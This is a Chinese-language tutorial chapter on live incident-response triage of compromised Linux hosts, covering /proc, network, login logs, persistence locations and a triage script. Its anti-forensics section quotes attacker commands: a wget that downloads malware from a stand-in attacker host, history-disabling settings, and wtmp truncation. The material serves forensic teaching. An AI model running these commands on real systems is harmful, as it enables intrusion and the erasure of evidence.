# Ch 21 — Linux IR Triage

> **目標：** 在入侵發生後，用 live response 手法快速盤點受害 Linux 主機的現況——進程、網路、登入、歷史記錄、persistence——並依揮發性順序保全最關鍵的證據。
> **環境：** Ubuntu 22.04 / Rocky Linux 9 x86_64；需要 root 或 sudo；不假設安裝了任何 EDR agent。

---

## 為什麼需要 Linux triage？

你做過 Linux 的 LKM rootkit、LD_PRELOAD 注入、reverse shell、crontab/systemd 植後門——這些招在 Windows 端有完整的 EDR 遙測，但 Linux server 往往只有最基本的 syslog 和 auth.log，甚至連 auditd 都沒開。

Live triage 的目的是：在還沒跑 dd 或 LiME 做全量擷取之前，把最容易消失的東西先撈出來。你攻擊時最忌諱留下的那些東西，正是我們鑑識時最想要的。

---

## 先建立直覺：揮發性順序（Order of Volatility）

RFC 3227 給了一個原則：**最快消失的先保全**。Linux 上的順序如下：

```
最快消失 ─────────────────────────────── 最慢消失
  │                                          │
  ▼                                          ▼
CPU寄存器/cache    記憶體(/proc)    網路連線    開啟的fd
  → 進程清單       → swap          → 磁碟log   → 檔案系統
  → 網路狀態       → 登入紀錄      → systemd journal
                                    → crontab/persistence
```

實務上 live response 腳本的執行順序應該跟這個一致。每執行一個動作都在改變系統（寫 log、更新 atime），所以動作越少越好，輸出要馬上重導向到外部媒體或遠端。

---

## 可疑進程挖掘：/proc/PID 是金礦

`/proc` 是 kernel 暴露給 userspace 的運行時資訊，而且是 **即時的**。你用 LD_PRELOAD 或 LKM 可以讓 `ls /proc` 的進程列表不顯示某個 PID，但 `/proc/PID` 本身的 inode 還在——如果你知道 PID 號碼，或者用 Volatility 從記憶體掃，就能繞過隱藏。

### 關鍵子目錄

| 路徑 | 內容 | 鑑識用途 |
|------|------|----------|
| `/proc/PID/exe` | 符號連結指向可執行檔 | 已刪除的 binary 會顯示 `(deleted)` |
| `/proc/PID/maps` | 記憶體映射（mmap 區段） | 找 injected shellcode、非常規路徑的 .so |
| `/proc/PID/fd/` | 所有開啟的 file descriptor | socket、pipe、刪除但仍開啟的檔案 |
| `/proc/PID/environ` | 啟動時的環境變數 | 藏在 env var 裡的 C2 位址、token |
| `/proc/PID/cmdline` | 完整命令列（null-delimited） | 偽裝成 `[kworker]` 的進程 |
| `/proc/PID/status` | UID/GID、執行緒數等摘要 | 確認實際 uid 是不是 0（setuid 提權） |
| `/proc/PID/net/tcp` | 該進程的 TCP socket（kernel namespace 隔離） | 容器/namespace 逃逸後的網路狀態 |

### 範例：binary 已刪除但仍在執行

攻擊者常在執行 dropper 後立刻把檔案 `rm` 掉，以為這樣就沒了。其實只要進程還活著，kernel 就保留 inode，`/proc/PID/exe` 指向的連結依然有效：

```bash
# 列出所有指向已刪除可執行檔的進程
ls -la /proc/*/exe 2>/dev/null | grep '(deleted)'
# 輸出（示意，依環境而異）：
# lrwxrwxrwx 1 root root 0 2026-08-01 03:12 /proc/3847/exe -> /tmp/.x11-unix/proc (deleted)

# 把記憶體裡的 binary 撈回來
cp /proc/3847/exe /evidence/recovered_binary
file /evidence/recovered_binary
# ELF 64-bit LSB executable, x86-64, dynamically linked
```

### 範例：maps 裡的異常 .so 注入

```bash
cat /proc/3847/maps | grep -v '\[' | awk '{print $6}' | sort -u
# 正常進程的 maps 應該只有 /usr/lib/ 底下的 .so 和自己的 binary
# 看到 /tmp/、/dev/shm/、或空路徑的可執行段就是問題
# 範例（示意）：
# 7f3a1b000000-7f3a1b001000 r-xp /dev/shm/.libcache.so (deleted)
```

---

## 網路連線：ss 與 netstat

`ss` 是現代工具（netstat 在許多發行版已棄用）：

```bash
# 所有 TCP/UDP 連線含進程 PID
ss -tunap

# 輸出欄位：State  Recv-Q  Send-Q  Local Address:Port  Peer Address:Port  PID/Process
# 找 ESTABLISHED 且連到非預期 IP，或 LISTEN 在非常規 port

# 找出所有對外的連線（排除 127.x 和 ::1）
ss -tnp state established | grep -v '127\.' | grep -v '::1'
```

把輸出存下來後，用 IP 去比對 threat intelligence 或 ASN 資訊：

```bash
# 快速 whois 檢查（需要網路）
ss -tnp state established | awk '{print $5}' | cut -d: -f1 | sort -u | \
  while read ip; do echo "$ip: $(whois $ip 2>/dev/null | grep -i 'orgname\|org-name' | head -1)"; done
```

踩雷：攻擊者用 `LD_PRELOAD` 勾住 `getdents64` 可以讓 `ss` 和 `netstat` 都看不到 socket，這時要從 `/proc/net/tcp` 和 `/proc/net/tcp6` 直接讀（raw hex 格式，需要轉換），或用 Volatility 從記憶體還原網路連線。

---

## 登入痕跡

### auth.log / secure

```bash
# Ubuntu/Debian
grep -E '(Accepted|Failed|Invalid|sudo)' /var/log/auth.log | tail -100

# RHEL/Rocky
grep -E '(Accepted|Failed|Invalid|sudo)' /var/log/secure | tail -100
```

看什麼：短時間內大量 Failed（brute force），接著突然一個 Accepted（成功），後面跟 sudo 提權——這是標準的 SSH brute + privilege escalation 序列。

### wtmp / btmp / lastlog

這三個是二進位格式，用 `last` / `lastb` / `lastlog` 讀：

```bash
last -F -a           # 成功登入歷史，-F 顯示完整時間，-a 顯示主機名在最後
lastb -F -a          # 失敗登入（要 root）
lastlog              # 每個帳號最近一次登入
```

**鑑識注意**：`last` 讀的是 `/var/log/wtmp`，攻擊者可以直接修改或截斷這個二進位檔來抹掉登入紀錄（`> /var/log/wtmp` 即清空），這時要靠 auth.log 或 auditd 的 login session 事件交叉比對。

```bash
# 確認 wtmp 最後修改時間（如果比你預期的早很多，可能被動過）
stat /var/log/wtmp
```

### 當前登入的 session

```bash
who -a               # 所有終端 session
w                    # 同上 + 在跑什麼命令
```

---

## 命令歷史與反鑑識

### .bash_history 的侷限

```bash
# 每個用戶的 bash 歷史
cat /home/*/. bash_history
cat /root/.bash_history
```

bash 的預設行為是 **只在 shell 正常結束時才寫入** `.bash_history`，且大小受 `HISTSIZE`/`HISTFILESIZE` 控制。攻擊者的標準反鑑識技巧：

```bash
# 常見的攻擊者操作（你看過的）
unset HISTFILE            # 不寫任何歷史
export HISTSIZE=0         # 不保留歷史
HISTFILE=/dev/null bash   # 新開一個不留紀錄的 shell

# 直接在命令前加空格（HISTCONTROL=ignorespace 生效時不記錄）
 wget http://attacker.com/malware -O /tmp/.x
```

鑑識時確認 `/etc/profile`、`~/.bashrc`、`~/.bash_profile` 裡有沒有上述設定。

### 替代來源

當 .bash_history 被清空，我們找：

| 來源 | 內容 | 路徑 |
|------|------|------|
| `/proc/PID/fd/` | stdin/stdout 的 pipe，有時還在 | 看 fd 0/1/2 |
| auditd EXECVE 記錄 | 每個 syscall 層級的命令執行 | `/var/log/audit/audit.log` |
| systemd journal | 部分 service 執行記錄 | `journalctl -xe` |
| shell HISTTIMEFORMAT | 有時間戳的歷史（如果有設） | 同 .bash_history |
| `/tmp`/`/var/tmp` 下的腳本 | 攻擊者遺留的工具 | 手動找 |

---

## Persistence 位置盤點

這是 Linux 上最容易遺漏的部分，因為 persistence 點非常多。系統化地跑完這些：

### 1. Crontab

```bash
crontab -l                          # 當前 user
crontab -u root -l                  # root
for u in $(cut -d: -f1 /etc/passwd); do echo "=== $u ==="; crontab -u $u -l 2>/dev/null; done
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/
```

### 2. Systemd units

```bash
# 列出所有啟用的 unit（含第三方）
systemctl list-unit-files --state=enabled

# 找非系統標準的 unit（路徑不在 /lib/systemd/system/ 的）
find /etc/systemd/system/ /run/systemd/system/ -name '*.service' -newer /usr/lib/systemd/system/systemd.service 2>/dev/null

# 看 unit 內容
systemctl cat <suspicious-unit>
```

後門 service 的特徵：`ExecStart` 指向 `/tmp`、`/dev/shm`、或者用 base64 編碼的 shell 命令。

### 3. 傳統啟動點

```bash
cat /etc/rc.local
ls -la /etc/init.d/
cat ~/.bashrc ~/.bash_profile ~/.profile
cat /etc/profile.d/*.sh
```

### 4. ld.so.preload（LD_PRELOAD rootkit 的最愛）

```bash
cat /etc/ld.so.preload
# 正常情況下這個檔案是空的或不存在
# 任何內容都要立刻調查
```

`/etc/ld.so.preload` 裡的路徑會被所有動態連結的進程自動載入，比 `LD_PRELOAD` 環境變數範圍更廣（因為連沒有設環境變數的進程也中招）。這是 user-mode rootkit 最愛用的機制，Ch 23 會深挖。

### 5. SUID/SGID 可執行檔

```bash
# 找全部 SUID
find / -perm -4000 -type f 2>/dev/null
# 找全部 SGID
find / -perm -2000 -type f 2>/dev/null

# 快速比對：把這份清單跟乾淨基準比，多出來的就是問題
# 或者找近期修改的（假設你知道最後一次系統更新的時間）
find / -perm -4000 -type f -newer /etc/passwd 2>/dev/null
```

### 6. SSH authorized_keys

```bash
find / -name authorized_keys 2>/dev/null
cat /root/.ssh/authorized_keys
cat /home/*/.ssh/authorized_keys
```

新增的 SSH 公鑰是隱蔽的 backdoor，不需要密碼，不出現在 /var/log/auth.log 的密碼驗證欄位（但會有 publickey accepted 記錄）。

---

## 範例：完整 triage 腳本骨架

這不是 forensically sound 的做法，但在初步 triage 的場景實用。關鍵：**先把可疑項目記下來，再決定要不要關機做離線分析**。

```bash
#!/bin/bash
# 所有輸出存到 /dev/shm/triage_$(date +%Y%m%d_%H%M%S)/
# 使用 /dev/shm 是為了減少磁碟寫入（雖然這也會改變記憶體狀態）
OUT=/dev/shm/triage_$(hostname)_$(date +%Y%m%d_%H%M%S)
mkdir -p $OUT

date > $OUT/timestamp.txt
uname -a >> $OUT/timestamp.txt

# Order of volatility 順序
ps auxf > $OUT/ps.txt
ss -tunap > $OUT/network.txt
who -a > $OUT/who.txt
last -F -a > $OUT/last.txt
lastb -F -a > $OUT/lastb.txt 2>&1

# /proc 深挖（找 deleted binary）
ls -la /proc/*/exe 2>/dev/null | grep deleted > $OUT/deleted_exe.txt
cat /etc/ld.so.preload > $OUT/ld_preload.txt 2>&1

# Persistence
for u in $(cut -d: -f1 /etc/passwd); do crontab -u $u -l 2>/dev/null; done > $OUT/crontab.txt
systemctl list-unit-files --state=enabled > $OUT/systemd_enabled.txt
find /etc/systemd /run/systemd -name '*.service' 2>/dev/null > $OUT/systemd_nondefault.txt
find / -perm -4000 -type f 2>/dev/null > $OUT/suid.txt
find / -name authorized_keys 2>/dev/null -exec cat {} \; > $OUT/authorized_keys.txt

# 歷史記錄
for h in /root/.bash_history /home/*/.bash_history; do
  echo "=== $h ===" >> $OUT/bash_history.txt
  cat $h >> $OUT/bash_history.txt 2>/dev/null
done

echo "Triage done: $OUT"
```

---

## 對比：各 persistence 機制的隱蔽程度

| Persistence 機制 | 肉眼可見 | 標準工具可見 | 防禦方偵測難度 |
|-----------------|---------|------------|-------------|
| crontab（user） | 是 | `crontab -l` | 低 |
| crontab（/etc/cron.d） | 是 | `ls` | 低 |
| systemd service | 是 | `systemctl` | 低—中（名字偽裝） |
| rc.local | 是 | `cat` | 低 |
| .bashrc/.profile | 是但容易忽略 | `cat` | 中 |
| LD_PRELOAD（env） | 需看 environ | `cat /proc/PID/environ` | 中 |
| /etc/ld.so.preload | 是 | `cat` | 中（影響全系統） |
| LKM（kernel module） | `lsmod` 可見，但可隱藏 | `lsmod` | 高（需記憶體分析） |
| SUID binary | `find` 可見 | `find` | 中（需基準比對） |
| authorized_keys | 是 | `cat` | 中（帳號本身合法） |

---

## 踩雷

1. **執行鑑識工具本身就在改變系統**：每個 `ls`、`cat`、`ps` 都會更新 atime（如果沒有 `noatime` mount option）、寫 bash history、可能觸發 auditd 記錄。務必先記錄「你的 triage 工具的雜湊值」，日後報告才能說明你做了什麼。

2. **`ps` 可以被 rootkit 欺騙**：user-mode rootkit（LD_PRELOAD）或 LKM rootkit 都能讓特定 PID 從 `ps` 輸出消失。交叉比對 `/proc` 目錄的 PID 列表和 `ps` 輸出，差異就是被隱藏的進程。指令：`diff <(ls /proc | grep '^[0-9]') <(ps aux | awk 'NR>1{print $2}' | sort -n)`（大致方向，輸出需要整理）。

3. **時間戳不可信**：`mtime`/`atime` 可以用 `touch -t` 任意竄改。ctime（inode change time）比 mtime 更難竄改，但也不是不可能。不要把「mtime 是去年」當成「這個檔案不可疑」的依據。

4. **`last` 和 `lastb` 讀的是 binary 檔案**，如果 `/var/log/wtmp` 被 `> /var/log/wtmp` 清空，你會看到空輸出。交叉比對 auth.log 的時間戳是必要的。

5. **`/etc/ld.so.preload` 影響範圍被低估**：這個檔案的 hook 是 libc 的 dynamic linker 在每次 `execve` 時讀取的，不需要 LD_PRELOAD 環境變數，連 sudo 啟動的進程也吃得到（除非 sudo 有清 LD_PRELOAD，但它讀的是這個系統級檔案）。在確認這個檔案有問題後，不要急著用任何 dynamically linked 的指令來繼續調查——改用 statically linked 的 busybox 或 Golang 工具。

---

## 進階延伸

- **Velociraptor** 的 `Linux.KapeFiles.Targets` artifact 可以系統化地收集 Linux triage 資料，比手動腳本更具可重複性。
- **osquery** 提供 SQL 介面查詢 `/proc` 資訊，適合自動化 triage（`SELECT pid, name, path FROM processes WHERE path LIKE '/tmp/%'`）。
- **GRR Rapid Response** 是 Google 開源的大規模 IR 平台，適合同時對上千台 Linux server 做 triage。
- **Forensic artifacts 標準化**：DFIR ORC（法國 ANSSI 的 Windows 工具）的精神可以移植到 Linux，把 triage 步驟固定下來確保每次執行一致。

---

## 本章重點整理

- **Order of volatility**：記憶體 > 網路狀態 > 進程清單 > 磁碟 log，永遠從最容易消失的開始。
- **`/proc/PID/exe`** 的 `(deleted)` 標記是偵測「執行後刪除」backdoor 的關鍵，要比 `ps` 輸出更值得信任（但 LKM rootkit 也能攔截）。
- **Persistence 清單**要系統化地跑完：cron、systemd、rc.local、.bashrc、ld.so.preload、SUID、authorized_keys——任何一個漏掉都可能讓攻擊者重新進入。
- **反鑑識意識**：.bash_history 幾乎不可信，要找 auditd 或 journal 補齊。
- **/etc/ld.so.preload** 有問題時，停止使用 dynamically linked 工具，改用 static binary。

## 自我檢核

1. 你在 `/proc/PID/maps` 裡看到一個可執行段（`r-xp`）但路徑是 `/dev/shm/.xxx`，下一步要做什麼？
2. 攻擊者如何讓 `crontab -l` 回傳空結果，但實際上有個惡意 cron job？
3. `last` 回傳空，但 auth.log 有登入記錄，最可能的原因是什麼？
4. 你找到一個 SUID root 的可執行檔在 `/usr/local/bin/sshd-helper`，hash 跟上個月的快照不同，下一步？
5. 為什麼在 ld.so.preload 有問題的機器上，要用 static linked 的 busybox 而不是系統的 `cat`？

## 延伸閱讀

1. **SANS FOR508（Advanced Incident Response, Threat Hunting and Digital Forensics）** — Linux triage 和 live response 的實務章節；讀 Lab 10–12 的 Linux artifact 蒐集部分，直接對應本章。
2. **[The DFIR Report](https://thedfirreport.com/)** — 找標籤 "Linux" 的案例；看職業藍隊在真實 Linux 入侵（例如 cryptominer、ransomware）中怎麼從 /proc 和 auth.log 重建攻擊鏈。
3. **[Linux Forensics Cheat Sheet（SANS Posters）](https://www.sans.org/posters/)** — artifact 路徑速查表，鑑識現場旁邊開著用。
4. **Hal Pomeranz, "Linux Forensics"（DFIR.training）** — 深挖 Linux artifact 細節，特別是 timestamp 與 journal 解析，補本章沒有展開的部分。
5. **[osquery 文件 — process_events table](https://osquery.io/schema/)** — 了解如何用 SQL 介面做系統化 triage，比手寫 shell script 更可維護。

---

→ [Ch 22 Linux 記憶體鑑識 + auditd/eBPF 偵測](./22-linux-memory-auditd-ebpf.md)
